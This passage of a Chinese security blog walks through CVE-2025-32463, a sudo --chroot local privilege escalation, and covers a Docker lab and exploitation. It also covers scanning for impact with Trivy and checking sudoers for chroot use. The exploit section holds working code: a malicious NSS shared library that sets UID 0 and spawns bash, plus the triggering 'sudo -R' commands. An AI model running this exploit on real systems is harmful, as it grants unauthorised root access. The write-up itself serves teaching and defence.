--<span class="hljs-built_in">rm</span> y4ney/cve-2025-32463-lab:<span class="hljs-built_in">source</span> bash<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it --<span class="hljs-built_in">rm</span> y4ney/cve-2025-32463-lab:deb bash<br></code></pre></td></tr></table></figure></li><li><p>执行工作目录下的 PoC 脚本。该脚本可以追加任何命令，若不追加任何命令，则默认打开一个交互式的 <code>bash</code> ；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./sudo-chwoot.sh <span class="hljs-built_in">id</span><br>./sudo-chwoot.sh <br></code></pre></td></tr></table></figure></li><li><p>由于我们在启动容器的时候添加了 <code>--rm</code> 参数，所以使用 <code>exit</code> 退出容器环境中过后，容器会自动销毁。若要删除镜像，执行下述命令即可。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker">docker rmi y4ney/cve-<span class="hljs-number">2025</span>-<span class="hljs-number">32463</span>-lab:source<br></code></pre></td></tr></table></figure><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker">docker rmi y4ney/cve-<span class="hljs-number">2025</span>-<span class="hljs-number">32463</span>-lab:deb<br></code></pre></td></tr></table></figure></li></ol><p><img src="/image/image_431f2OMa-_.png" alt="图 8：漏洞利用流程" title="图8：漏洞利用流程"></p><p>若要自行构建镜像，详情请看我刚刚创建的项目<a href="https://github.com/y4ney/CVE-2025-32463-lab" title="CVE-2025-32463-lab">CVE-2025-32463-lab</a>的 README，该镜像 fork 自 <a href="https://github.com/pr0v3rbs/CVE-2025-32463_chwoot" title="pr0v3rbs&#x2F;CVE-2025-32463_chwoot">pr0v3rbs&#x2F;CVE-2025-32463_chwoot</a> 项目，进行了一定地改造。</p><p><img src="/image/image_IXsDe1VMyI.png" alt="图 9：CVE-2025-32463-lab 项目描述" title="图9：CVE-2025-32463-lab 项目描述"></p><h3 id="2-3-漏洞验证"><a href="#2-3-漏洞验证" class="headerlink" title="2.3 漏洞验证"></a>2.3 漏洞验证</h3><p>我们可以通过执行下述命令，切换到一个不存在的目录中并执行一个不存在的命令，来快速验证漏洞是否存在。如图 10 所示，我们可以执行 <code>sudo -R hacker hacker</code>命令来判断漏洞是否存在：</p><ul><li>若当前的<code>sudo</code> 的版本为受影响版本 <code>1.9.15p5-3ubuntu5</code>，那么命令执行报错；</li><li>若当前的<code>sudo</code>的版本为不受影响版本<code>1.9.15p5-3ubuntu5.24.04.1</code>，那么命令执行过后，会要求我们输入用户密码。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -R /does/not/exist fakecmd fakecmd<br></code></pre></td></tr></table></figure><p><img src="/image/image_m2E-ZF3QDc.png" alt="图 10：漏洞验证流程" title="图 10：漏洞验证流程"></p><h3 id="2-4-环境搭建"><a href="#2-4-环境搭建" class="headerlink" title="2.4 环境搭建"></a>2.4 环境搭建</h3><p>接下来，我们手把手教学：如何通过容器快速搭建漏洞环境。本次漏洞复现将在 ubuntu24.04 容器镜像中完成。执行下述命令，马上开启我们的旅程吧。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it --<span class="hljs-built_in">rm</span> ubuntu:24.04 bash<br></code></pre></td></tr></table></figure><p>为了保持精简，Ubuntu、Debian 和 Alpine 等多种基础镜像都不预装 <code>sudo</code>，且<code>apt</code>和<code>yum</code>等系统包管理工具安装的 <code>sudo</code> 可能会被二次修改（例如打上了安全补丁、禁用了某些选项等），这可能导致漏洞无法复现或者是行为不一致。</p><p>所以我们需要基于源码，自行构建并安装一个受影响版本的<code>sudo</code>。此外，还需要创建一个用于安全测试的普通用户，例如 <code>yaney</code>。具体步骤如下：</p><ol><li><p>安装 <code>sudo</code> 依赖库、编译工具链和源码下载工具；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get update<br>apt-get install -y wget ca-certificates build-essential pkg-config libpam0g-dev libselinux1-dev zlib1g-dev  libssl-dev <br></code></pre></td></tr></table></figure><ul><li>源码下载工具：用于从官网获取<code>sudo</code> 源码并通过 HTTPS 安全下载。包括：<code>wget</code>,<code>ca-certificates</code>；</li><li>编译工具链：用于从源码构建 <code>sudo</code>，包括编译器、构建系统和依赖检测工具。包括：<code>build-essential</code>、<code>pkg-config</code>；</li><li>sudo 依赖库：提供认证、安全上下文、压缩和加密等<code>sudo</code> 所需的基础功能支持。包括：<code>libpam0g-dev</code>,<code>libselinux1-dev</code>,<code>zlib1g-dev</code>,<code>libssl-dev</code>。</li></ul></li><li><p>清理 apt 缓存，减小镜像体积；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -rf /var/lib/apt/lists/*<br></code></pre></td></tr></table></figure></li><li><p>切换到<code>/opt</code> 目录，该目录一般用于存放第三方源码或程序，非常适合存放 <code>sudo</code> 的源码。然后下载并解压<code>sudo</code>的源代码压缩包（版本为<code>1.9.16p2</code>）；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /opt<br>wget https://www.sudo.ws/dist/sudo-1.9.16p2.tar.gz<br>tar xzf sudo-1.9.16p2.tar.gz<br></code></pre></td></tr></table></figure></li><li><p>编译并安装 <code>sudo</code>；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> sudo-1.9.16p2 <br><span class="hljs-comment"># 预编译。不启用 libgcrypt 支持，构建完成后将程序安装到 /usr 目录下。</span><br>./configure --disable-gcrypt --prefix=/usr<br><span class="hljs-comment"># 编译</span><br>make<br><span class="hljs-comment"># 安装</span><br>make install<br></code></pre></td></tr></table></figure></li><li><p>新创建一个普通的安全测试用户并切换，例如<code>yaney</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">useradd -m -s /bin/bash yaney<br>su yaney<br></code></pre></td></tr></table></figure><ul><li><code>-m</code>：自动创建用户的 home 目录<code>/home/yaney</code>；</li><li><code>-s /bin/bash</code>：指定默认 SHELL 为 <code>bash</code>。</li></ul></li></ol><h3 id="2-5-漏洞利用"><a href="#2-5-漏洞利用" class="headerlink" title="2.5 漏洞利用"></a>2.5 漏洞利用</h3><p>准备好环境过后，我们就可以快速进行漏洞利用了，这个过程非常简单，让我们来试一试吧。</p><h4 id="步骤一：准备攻击环境"><a href="#步骤一：准备攻击环境" class="headerlink" title="步骤一：准备攻击环境"></a>步骤一：准备攻击环境</h4><ol><li><p>创建一个用于构造攻击环境的临时目录，这个临时目录在使用结束过后，系统会自行删除。需要注意的是：<code>XXXXXX</code>是特殊标记，告诉<code>mktemp</code>将其替换成随机字符（通常是 6 个字母&#x2F;数字）。所以我们进入该目录的时候，<code>XXXXXX</code>需要替换成实际的字符串；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mktemp</span> -d /tmp/sudochroot.stage.XXXXXX<br><span class="hljs-built_in">cd</span> /tmp/sudochroot.stage.XXXXXX<br></code></pre></td></tr></table></figure></li><li><p>&#x20;写入带有构造函数<code>hacker</code>的 C 代码，实现一旦加载就提权执行（libnss 插件）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">cat &gt; hacker.c &lt;&lt;EOF<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br>__attribute__((constructor)) <span class="hljs-type">void</span> <span class="hljs-title function_">hacker</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  setreuid(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>  setregid(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>  chdir(<span class="hljs-string">&quot;/&quot;</span>);<br>  execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br>EOF<br><br></code></pre></td></tr></table></figure><ul><li>攻击脚本需要包含构造函数<code>__attribute__((constructor))</code>，与主函数<code>main()</code>需要手动触发不一样，构造函数在共享库被加载时就会自动执行。这样我们后续编译的<code>.so</code>文件在被加载时就能直接运行恶意代码了；</li><li>将有效 UID&#x2F;GID 和真实 UID&#x2F;GID 都设置为 <code>0</code>，即切换到<code>root</code> 用户。之所以这么设置，是因为一些系统调用或者操作仍然依赖于有效 UID&#x2F;GID 或真实 UID&#x2F;GID 是为 0；</li><li>切换当前工作目录到<code>/</code>，避免当前目录被删、影响 shell 工作；</li><li>重新打开一个新的 <code>bash</code> 。</li></ul></li></ol><h4 id="步骤二：构造-chroot-文件系统结构"><a href="#步骤二：构造-chroot-文件系统结构" class="headerlink" title="步骤二：构造 chroot 文件系统结构"></a>步骤二：构造 chroot 文件系统结构</h4><ol><li><p>创建攻击目录结构；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p hacker/etc libnss_<br></code></pre></td></tr></table></figure><ul><li><code>hacker/etc</code> 用来存放后续所说的 <code>nsswitch.conf</code>文件 和 <code>group</code> 文件。若<code>--chroot</code> 到 <code>hacker</code> 文件夹中，那么这些文件路径将被解析为寻常模式，即：<ul><li><code>hacker/etc/nsswitch.conf</code>就被解析为<code>/etc/nsswitch.conf</code>；</li><li><code>hacker/etc/group</code> 就被解析为<code>/etc/group</code>；</li></ul></li><li><code>libnss_</code> 用来存放 <code>hacker.c</code> 所编译好的恶意动态链接库。</li></ul></li><li><p>创建 <code>nsswitch.conf</code>文件，配置加载我们自定义的 NSS 模块，即 <code>--chroot</code>若要解析用户信息（passwd），需要加载名为 <code>hacker</code> 的 NSS 模块；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;passwd: /hacker&quot;</span> &gt; hacker/etc/nsswitch.conf<br></code></pre></td></tr></table></figure></li><li><p>拷贝一份 group 文件以避免 NSS 报错。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /etc/group hacker/etc<br></code></pre></td></tr></table></figure></li></ol><h4 id="步骤三：构造并命名恶意共享库"><a href="#步骤三：构造并命名恶意共享库" class="headerlink" title="步骤三：构造并命名恶意共享库"></a>步骤三：构造并命名恶意共享库</h4><p>使用<code>gcc -shared -fPIC</code>编译带构造函数的共享库<code>hacker.c</code>，输出为<code>libnss_/hacker.so.2</code>，匹配<code>passwd: /hacker</code> 的模块路径拼接逻辑。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -shared -fPIC -Wl,-init,hacker -o libnss_/hacker.so.2 hacker.c<br><br></code></pre></td></tr></table></figure><ul><li>-shared：编译为共享对象（即<code>.so</code> 动态链接库）而不是可执行文件；</li><li>-fPIC：生成与位置无关的代码，是编译动态库时必须加的；</li><li>-Wl,-init,hacker：告诉链接器，当动态库被加载时，自动调用<code>hacker()</code> 函数；</li><li>-o libnss _&#x2F;hacker.so.2：输出文件名为<code>libnss_/hacker.so.2</code>；</li><li>hacker.c：源代码文件，定义了<code>void hacker(void)</code> 函数。</li></ul><h4 id="步骤四：触发漏洞执行提权"><a href="#步骤四：触发漏洞执行提权" class="headerlink" title="步骤四：触发漏洞执行提权"></a>步骤四：触发漏洞执行提权</h4><p>使用<code>sudo -R</code>进入 <code>chroot</code> 环境，并在 <code>chroot</code> 环境中执行<code>/bin/bash</code>，同时触发 <code>glibc</code>初始化 NSS，自动加载我们刚刚构造的恶意共享库<code>libnss_/hacker.so.2</code>并进行提权。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -R hacker /bin/bash<br></code></pre></td></tr></table></figure><p><img src="/image/image_Y6ta-LnzQ4.png" alt="图 11：漏洞利用流程" title="图 11：漏洞利用流程"></p><h3 id="2-6-影响面排查"><a href="#2-6-影响面排查" class="headerlink" title="2.6 影响面排查"></a>2.6 影响面排查</h3><p><code>sudo</code> 是大多数主机都会安装的软件包，如果公司资产包含了 <code>sudo</code>，那么我们该如何进行影响面排查呢？研究过云原生安全的同学应该都听说过一款镜像安全工具：<a href="https://trivy.dev/latest/" title="Trivy">Trivy</a>。Trivy 拥有非常强大的功能，我们这里使用的是它的漏洞扫描功能。</p><p><img src="/image/image_r4gp6QUwbp.png" alt="图 12：使用 Trivy 进行影响面排查" title="图 12：使用 Trivy 进行影响面排查"></p><p>若需要扫描的是镜像，那么我们使用<code>image</code>子命令即可。Trivy 拥有多种扫描器，为了快速得到结果，我们仅开启了漏洞扫描器<code>vuln</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image &lt;image-name&gt; --scanners vuln<br></code></pre></td></tr></table></figure><p>Trivy 已经探测出  <code>y4ney/cve-2025-32463-lab:source</code> 的操作系统是 ubuntu:24.04，并且识别出了 226 个系统层软件包，这些系统层软件包共包含 870 个漏洞；且镜像并未被识别出应用层依赖库，因此不包含应用层的漏洞。</p><p><img src="/image/image_85AvWOVKeq.png" alt="图 13：使用 Trivy 对 y4ney&#x2F;cve-2025-32463-lab:source 镜像进行扫描" title="图 13：使用 Trivy 对 y4ney&#x2F;cve-2025-32463-lab:source 镜像进行扫描"></p><p>若对镜像<code>y4ney/cve-2025-32463-lab:deb</code>进行扫描，则被识别出了 168 个系统层软件包和 857 个漏洞。</p><p><img src="/image/image_2JLJBZujvB.png" alt="图 14：使用 Trivy 对 y4ney&#x2F;cve-2025-32463-lab:deb 镜像进行扫描" title="图 14：使用 Trivy 对 y4ney&#x2F;cve-2025-32463-lab:deb 镜像进行扫描"></p><p>执行下述命令，我们发现：<code>y4ney/cve-2025-32463-lab:source</code> 并未扫描出 CVE-2025-32463 漏洞，而<code>y4ney/cve-2025-32463-lab:deb</code> 却可以扫描出 CVE-2025-32463 漏洞。造成这种关键差异的原因是什么呢？我们再了解一些知识，后续再详细分析其原因。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image &lt;image-name&gt; --scanners vuln --format json --quiet | jq <span class="hljs-string">&#x27;.Results[].Vulnerabilities[]&#x27;</span>| grep CVE-2025-32463<br></code></pre></td></tr></table></figure><p><img src="/image/image_EUlKBOv6qe.png" alt="图 15：两类镜像中 CVE-2025-32463 漏洞的扫描情况" title="图 15：两类镜像中CVE-2025-32463 漏洞的扫描情况"></p><p>Trivy 主要是通过版本比对来识别软件包中的漏洞，因此这些漏洞不一定都需要进行修复。我们需要考虑的因素包含方方面面，例如：</p><ul><li>漏洞的威胁等级并未达到高危、甚至超危；</li><li>漏洞的威胁等级并不等于它的风险等级；</li><li>包含漏洞的软件包可能并未被使用到，因此漏洞不具备可达性；</li><li>强行修复系统层软件包，可能会导致依赖它的应用崩溃；</li><li>并非所有的漏洞都拥有修复补丁，让我们进行升级；</li><li>……</li></ul><p>若直接对 ubuntu 官方最新的镜像进行漏洞扫描，我们都会发现：尽管是不包含任何第三方内容的官方最新镜像，也不会是完全不包含漏洞的，那么基于这些基础镜像构建的镜像，我们怎么能要求它们不能包含任何漏洞呢？</p><p><img src="/image/image_pyUtqydEgT.png" alt="图 16：ubuntu 最新的官方漏洞也包含部分漏洞" title="图 16：ubuntu 最新的官方漏洞也包含部分漏洞"></p><p>目前业界没有完全公开的特别好的工程化方案和案例，让我们基于风险对这些漏洞进行重定级、降噪以及自动化修复。去年，我在 CCS 大会上对这方面的问题进行了探讨，但方案还未走出实验室，进行企业级别的落地，大家可以酌情参考参考。相关内容请查看<a href="https://github.com/miao2sec/awesome-cloud-native-security/blob/main/%E6%BC%94%E7%A4%BA%E6%96%87%E7%A8%BF/%E9%87%91%E8%9E%8D%E7%A7%91%E6%8A%80%E4%B8%AD%E7%9A%84%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%EF%BC%9A%E5%9F%BA%E4%BA%8E%20eBPF%20%E5%92%8C%20WASM%20%E7%9A%84%E6%BC%8F%E6%B4%9E%E9%99%8D%E5%99%AA%E6%8A%80%E6%9C%AF.pdf" title="《金融科技中的容器安全：基于eBPF和WASM的漏洞降噪技术》">《金融科技中的容器安全：基于 eBPF 和 WASM 的漏洞降噪技术》</a>。</p><p><img src="/image/image_70MpL9pgzs.png" alt="图 17：金融科技中的容器安全：基于 eBPF 和 WASM 的漏洞降噪技术" title=" 7：金融科技中的容器安全：基于eBPF和WASM的漏洞降噪技术"></p><p>若需要扫描的是主机，我们可以使用 Trivy 的 <code>rootfs</code>子命令。其实主机漏洞扫描和镜像漏洞扫描的原理和实现方式大同小异，唯一的区别就是：容器镜像的漏洞扫描首先需要对镜像文件进行解压缩的操作，而主机漏洞扫描则不需要。主机漏洞扫描和镜像漏洞扫描后续同样需要进行相同的目录遍历、关键文件读取以及软件包信息解析等系列的操作，然后再通过版本比对的方式完成漏洞扫描。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy rootfs / --scanners vuln<br></code></pre></td></tr></table></figure><p>若我们无法使用工具进行扫描，还可以利用 Trivy 的漏洞库快速查询到漏洞的影响范围。Trivy 的漏洞库是基于 <a href="https://github.com/boltdb/bolt" title="Boltdb">Boltdb</a> 实现的，Boltdb 是 <a href="https://github.com/etcd-io/etcd" title="Etcd">Etcd</a> 等中间件所选用的数据库。如图 18 所示，我们可以从 trivy 的缓存路径中找到其漏洞库文件<code>trivy.db</code>。</p><p><img src="/image/image_mEtw_DnHOG.png" alt="图 18：查找 Trivy 漏洞库路径" title="图 18：查找 Trivy 漏洞库路径"></p><p>与常见的数据库不一样的是，Boltdb 数据库的使用体验不佳，无法使用 SQL 语句进行查询和编辑，我们需要编写 Golang 代码来进行更高级的操作。当然，也有封装得不错的工具，如图 19 所示，我们可以使用 <a href="https://github.com/devilcove/bboltEdit" title="bboltEdit">bboltEdit</a> 查看和编辑 Boltdb 数据库文件。</p><p><img src="/image/image_wdqq-vpLhE.png" alt="图 19：使用 bboltEdit 查看 trivy 的漏洞库" title="图 19：使用 bboltEdit 查看 trivy 的漏洞库"></p><p>但是该工具还是无法满足我们的需求，那就是：快速定位某 CVE 漏洞的影响范围。这里，我们再推荐一个可将 BoltDB 形式的 Trivy 漏洞库转化为 MySQL、SQLite 和 Postgres 这些常见的数据库类型的工具：<a href="https://github.com/k1LoW/trivy-db-to" title="trivy-db-to">trivy-db-to</a>。</p><p>trivy-db-to 默认将各供应商的安全公告数据都整合在一张名为 <code>vulnerability_advisories</code>的表中，而 Trivy 就是利用这些安全公告数据进行版本比对，然后再使用 <code>vulnerability</code> 表的数据来补充漏洞描述、威胁等级和参考链接等详细信息。</p><p>因此，我们只需要在<code>vulnerability_advisories</code>中查询 CVE 编号为 CVE-2025-32463 即可。如图 20 所示，该漏洞的影响范围不仅和操作系统类型和版本有关，所影响的软件包名称和修复版本都会有所不同，因此，我们需要进行仔细地甄别。</p><p><img src="/image/image_6q3NTpOGrL.png" alt="图 20：CVE-2025-32463 的影响范围" title="图 20：CVE-2025-32463 的影响范围"></p><p>回到之前的问题，为什么 <code>y4ney/cve-2025-32463-lab:source</code>镜像无法扫描出 CVE-2025-32463 漏洞呢？我们从两方面进行排查：</p><ol><li>Trivy 的漏洞库中是否指明了 ubuntu:24.04 镜像受该漏洞影响，且软件包名称和修复版本是多少？</li><li>Trivy 是否识别出了 <code>sudo</code> 系统层软件包及其版本？</li></ol><p>经过查询，第一个问题的答案是 YES，那么我们来排查第二个问题。如图 21 所示，我们发现<code>y4ney/cve-2025-32463-lab:source</code>并未被识别出 <code>sudo</code> 软件包，因此无法扫描出 CVE-2025-32463 漏洞。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image &lt;image-name&gt; --scanners vuln --list-all-pkgs --format json --quiet | jq <span class="hljs-string">&#x27;.Results[].Packages[]&#x27;</span> | grep <span class="hljs-built_in">sudo</span><br></code></pre></td></tr></table></figure><p><img src="/image/image_bZL07ontRY.png" alt="图 21：两类镜像中 sudo 软件包的识别情况" title="图 21：两类镜像中 sudo 软件包的识别情况"></p><p>前面我们说了，Trivy 会对镜像文件进行解压缩操作，然后遍历目录、读取关键文件并解析出软件包信息，这些操作均由同一团队的<a href="https://github.com/aquasecurity/fanal" title="Fanal">Fanal</a> 容器静态分析库完成，但是该项目于 2022 年 6 月 22 日已经归档，并作为 Trivy 的一部分进行维护和更新。</p><p><img src="/image/image_4wbcm-W8kC.png" alt="图 22：fanal 项目描述" title="图 22：fanal 项目描述"></p><p>查看 Trivy 中的 Fanal 源码，我们发现：Trivy 主要依赖解析 apk、dpkg 和 rpm 等系统层软件包管理工具来识别系统层软件包的。而我们通过 apt 安装<code>sudo</code> 时，所使用的底层工具是 dpkg。所以 Trivy 是通过识别 dpkg 一系列配置文件和目录来识别出软件包信息的，包括 <code>sudo</code>。</p><p><img src="/image/image_t27w6RRkBr.png" alt="图 23 trivy 关于 dpkg 软件包解析的源码实现" title="图 23 trivy 关于 dpkg 软件包解析的源码实现"></p><p><code>y4ney/cve-2025-32463-lab:deb</code>镜像正式通过 <code>dpkg</code> 安装的 <code>sduo</code>，因此可以识别出 CVE-2025-32463 漏洞。而<code>y4ney/cve-2025-32463-lab:source</code> 镜像的<code>sudo</code>是通过 <code>make</code> 自编译而来的，因此无法识别出漏洞。</p><p><img src="/image/image_HiGVkBsATm.png" alt="图 24：两类镜像中不同的 sudo 安装方式说明" title="图 24：两类镜像中不同的sudo 安装方式说明"></p><p>这也是 Trivy 官方文档中指出的问题：Trivy 不支持第三方（或自编译）的软件包和二进制文件，但支持 Red Hat 和 Debian 等供应商提供的官方包。</p><p><img src="/image/image_y8eG_7iyvY.png" alt="图 25：Trivy 不支持第三方（或自编译）的软件包和二进制文件" title="图 25：Trivy 不支持第三方（或自编译）的软件包和二进制文件"></p><p>这是 Trivy 工具的局限吗？我反而认为这是大多数漏洞扫描工具的局限，例如：当我们打开 Docker Hub 的 Scout 功能时，它也仅能识别出<code>y4ney/cve-2025-32463-lab:deb</code>镜像中的 sudo 软件包和 CVE-2025-32463 漏洞。</p><p><img src="/image/image_fRnHe3ukwq.png" alt="图 26：Docker Hub 的 Scout 功能和 Trivy 的扫描结果一致" title="图 26：Docker Hub 的 Scout 功能和 Trivy 的扫描结果一致"></p><p>因此，为了避免类似的漏报事故发生，我们只能从 DevOps 中规范开发者和运维人员的操作，来提高软件供应链的透明度，即：避免使用第三方的（或自编译的）软件包和二进制文件。</p><p>如图 27 所示，在 CentOS 7 中漏洞复现失败。我们再次回顾图 20 查询结果，发现该漏洞所影响范围并未包括 CentOS 7，因此 CentOS 7 不受该漏洞的影响。</p><p><img src="/image/image_BmgXxPTqzC.png" alt="图 27：CentOS 7 中无法进行漏洞复现" title="图 27：CentOS 7 中无法进行漏洞复现"></p><p>查看<a href="https://access.redhat.com/security/cve/cve-2025-32463" title="RedHat">RedHat</a> 的安全公告数据，RedHat 告诉我们：由于受影响的版本范围有限，此漏洞不会影响 RHEL-9 或任何更早版本的 RHEL。因此，Openshift 也不会受到此漏洞的影响。</p><p><img src="/image/image_MdDVfo6fFs.png" alt="图 28：RedHat 关于 CVE-2025-32463 的安全公告" title="图 28：RedHat 关于 CVE-2025-32463 的安全公告"></p><p>需要提示的是，漏洞的威胁等级还与供应商有关。如图 29 所示，Azure 和 cbi-mariner 都认为该漏洞的威胁等级为超危，但是 amazon 和 ubuntu 等供应商认为该漏洞的威胁等级为高危。那么我们该听谁的呢？</p><p><img src="/image/image_7sDv4vIv4J.png" alt="图 29：不同供应商对 CVE-2025-32463 有不同的安全定级" title="图 29：不同供应商对 CVE-2025-32463 有不同的安全定级"></p><p>前面我们说了，这些操作系统供应商会对 <code>sudo</code> 进行二改和维护，因此他们还会基于操作系统的特性，对漏洞进行重定级。所以我们应该优先参考供应商所定义的威胁等级，再参考 NVD 等标准漏洞库所定义的安全等级，Trivy 也会根据这种思路自动为漏洞选择一个对应的威胁等级。</p><p>这是我能想到的在影响面排查中，常见的误区。最后，我已经 fork 了一份 trivy-db-to，并对其进行了二改。<a href="https://github.com/y4ney/trivy-db-to" title="y4ney&#x2F;trivy-db-to">y4ney&#x2F;trivy-db-to</a> 不仅优化了日志的输出，还转化了数据源的数据，大家可以通过 <code>data_source</code> 表查看 trivy 的漏洞数据源。</p><p><img src="/image/image__bHzakfFZl.png" alt="图 30：y4ney&#x2F;trivy-db-to 的执行结果" title="图 30 ：y4ney&#x2F;trivy-db-to 的执行结果"></p><p><img src="/image/image_m8qagxmflc.png" alt="图 31：y4ney&#x2F;trivy-db-to 导出的漏洞数据源" title="图 31 ：y4ney&#x2F;trivy-db-to 导出的漏洞数据源"></p><h3 id="2-7-环境排查"><a href="#2-7-环境排查" class="headerlink" title="2.7 环境排查"></a>2.7 环境排查</h3><p>除了升级 <code>sudo</code> 版本，目前尚无其他有效的缓解措施。由于 <code>sudo</code> 在解析命令时存在缺陷，允许用户自定义 <code>chroot</code> 目录的机制容易引发错误，且该功能在实际中并不常用。从 <code>sudo</code> 1.9.17p1 起，<code>--chroot</code> 参数已被弃用，并计划在后续版本中彻底移除。</p><p>若无法通过版本比对的方式对影响面进行排查，建议对当前环境进行全面排查，确保未使用存在安全风险的 <code>chroot</code> 配置，以及避免继续使用该参数，因为如果实现不当，可能会无意中降低系统安全性。相关措施如下所示：</p><ul><li>搜索任何使用<code>chroot</code>的情况。检查<code>/etc/sudoers</code>文件以及<code>/etc/sudoers.d</code>目录下的所有规则。如果 <code>sudo</code> 规则存储在 LDAP 中，可使用如<code>ldapsearch</code> 等工具导出规则进行审查。</li><li>查找规则中是否使用了<code>runchroot=</code>选项或<code>CHROOT=</code> 指令。</li><li>还可以在系统日志中搜索 <code>sudo</code> 相关条目。任何使用了<code>chroot</code>的命令都会以<code>CHROOT=</code> 字样记录在日志中。</li></ul><h3 id="2-8-源码分析"><a href="#2-8-源码分析" class="headerlink" title="2.8 源码分析"></a>2.8 源码分析</h3><p>2013 年 6 月 28 日，<code>sudo</code> 在 1.9.14 版本的一项更改给未来引入了巨大的隐患：当在 <code>sudoers</code> 中指定了 <code>chroot</code> 时，改进了命令匹配的方式。现在，<code>sudoers</code> 插件会在进行命令匹配之前，根据需要先切换根目录。此前的做法是仅在处理路径时将 <code>chroot</code> 路径简单地添加为前缀。</p><p><img src="/image/image_pcalFIH05q.png" alt="图 32：sudo 1.9.14 中引发漏洞的更改记录" title="图 32： sudo 1.9.14 中引发漏洞的更改记录"></p><p>问题出在允许非特权用户对其可控的、可写的、不受信任的路径调用<code>chroot()</code>。无论用户是否配置了相应的 <code>sudo</code> 规则，<code>sudo</code> 都会多次调用<code>chroot()</code>。允许低权限用户以 <code>root</code> 权限对可写位置执行<code>chroot()</code>会带来多种安全风险。许多应用程序（例如 SSH）都明确防范这种情况。例如，如果目标位置不是由 <code>root</code> 拥有，SSH 将拒绝执行<code>chroot()</code>。</p><p><code>pivot_root()</code>和<code>unpivot_root()</code>函数定义在<a href="https://github.com/sudo-project/sudo/blob/f8ff956e17c36d44b9465688995821c8d890b451/plugins/sudoers/pivot.c" title="plugins&#x2F;sudoers&#x2F;pivot.c">plugins&#x2F;sudoers&#x2F;pivot.c</a>中，用于处理<code>chroot</code>相关的逻辑。在这两个函数调用之间，会触发名称服务切换（NSS）操作，导致系统从不受信任的环境中加载<code>/etc/nsswitch.conf</code> 配置文件。该文件包含指令，用于告诉系统如何获取用户、用户组和主机的信息。可以列出多个信息源，系统会按顺序搜索，直到找到匹配项为止。</p><p><img src="/image/image_cpESTgiONG.png" alt="图 33：sudo 的 pivot_root() 和 unpivot_root() 函数实际上直接使用了 chroot" title="图 33：sudo 的 pivot_root() 和 unpivot_root() 函数实际上直接使用了 chroot"></p><p>在 Linux 系统中，<code>nsswitch.conf</code> 